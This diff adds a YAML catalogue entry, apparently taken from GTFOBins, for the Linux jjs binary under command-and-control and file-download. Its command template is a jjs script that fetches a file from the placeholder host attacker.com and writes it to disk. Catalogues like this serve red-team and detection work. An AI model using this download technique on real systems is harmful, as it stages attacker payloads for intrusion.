@@ -1,0 +1,41 @@
+id: gtfobins/jjs/download/unprivileged
+type: binary
+platform: linux
+name: jjs
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'jjs
+
+    var URL = Java.type(''java.net.URL'');
+
+    var ws = new URL(''http://attacker.com/path/to/input-file'');
+
+    var Channels = Java.type(''java.nio.channels.Channels'');
+
+    var rbc = Channels.newChannel(ws.openStream());
+
+    var FileOutputStream = Java.type(''java.io.FileOutputStream'');
+
+    var fos = new FileOutputStream(''/path/to/output-file'');
+
+    fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
+
+    fos.close();
+
+    rbc.close();'
+references:
+- https://gtfobins.github.io/gtfobins/jjs/
+tags:
+- linux
+- unix
+- gtfobins
